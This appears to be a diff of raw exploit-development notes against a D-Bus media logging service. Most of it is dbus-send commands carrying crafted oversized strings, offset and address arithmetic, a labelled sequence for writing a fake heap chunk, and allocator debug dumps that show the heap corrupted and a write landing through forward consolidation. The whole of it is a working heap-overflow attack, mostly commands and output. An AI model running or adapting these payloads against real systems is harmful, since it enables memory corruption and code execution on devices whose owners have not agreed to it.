@@ -6,10 +6,57 @@ dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(prin
 
 0x21d00 = 138496 / 2 = 69248 (0x10e80)
 0x78 = 120 - 8 = 112 (0x70)
+0x403E03A0
+
+0xe5b0bf
+0xe5b1bf
+0xe5b8bf
 
 dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..69248})"
 dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..69240})ggggggggttttllll$(printf 'a%.0s' {1..104})"
 dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 a"
 dbus-send --system /media/log/medialog media.log.medialog.Queue string:"2 0"
 dbus-send --system /media/log/medialog media.log.medialog.Queue string:"2 1"
-dbus-send --system /media/log/medialog media.log.medialog.Queue string:"0 aaaaa"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"0 aaaa"
+
+# Steps to write fake chunk without breaking heap
+dbus-send --system --dest=media.log.medialog --type=signal /media/log/medialog media.log.medialog.Queue string:"1 a"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..240})gggggggg"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 a"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"2 1"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"2 0"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"0 aaaa"
+
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..252})gggg"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..252})$(printf '\x0c')"
+
+137956 + 326800 + 65328 = 530084
+xfree(0x40483728)
+CHUNK DEBUG (free head = 0x40483844)
+Chunk @0x40402000 (size     ff38) (prev size ffffffff)
+Chunk @0x40411f40 (size     ff58) (prev size     ff38)
+Chunk @0x40421ea0 (size     ff58) (prev size     ff58)
+Chunk @0x40431e00 (size     ff58) (prev size     ff58)
+Chunk @0x40441d60 (size     ff58) (prev size     ff58)
+Chunk @0x40451cc0 (size     ff58) (prev size     ff58)
+Chunk @0x40461c20 (size    10d78) (prev size     ff58)
+Chunk @0x404729a0 (size    10d78) (prev size    10d78)
+Chunk @0x40483720 (size        c) (prev size    10d78)
+Chunk @0x40483734 (size      100) (prev size        c)
+Chunk @0x4048383c (size bfb9e531) (prev size        0) (next @  0x77e7b7)
+Chunk @   0x21d74 (heap broken?!?)
+xmalloc(12) => 0x40483728
+Coalescing FD @0x40483734 adding @0x4048383c
+Write due to forward consolidation at 0x21d78
+CHUNK DEBUG (free head = 0x40483734)
+Chunk @0x40402000 (size     ff38) (prev size ffffffff)
+Chunk @0x40411f40 (size     ff58) (prev size     ff38)
+Chunk @0x40421ea0 (size     ff58) (prev size     ff58)
+Chunk @0x40431e00 (size     ff58) (prev size     ff58)
+Chunk @0x40441d60 (size     ff58) (prev size     ff58)
+Chunk @0x40451cc0 (size     ff58) (prev size     ff58)
+Chunk @0x40461c20 (size    10d78) (prev size     ff58)
+Chunk @0x404729a0 (size    10d78) (prev size    10d78)
+Chunk @0x40483720 (size        c) (prev size    10d78)
+Chunk @0x40483734 (size bfb9e639) (prev size        c) (next @  0x77e7b7)
+Chunk @   0x21d74 (heap broken?!?)
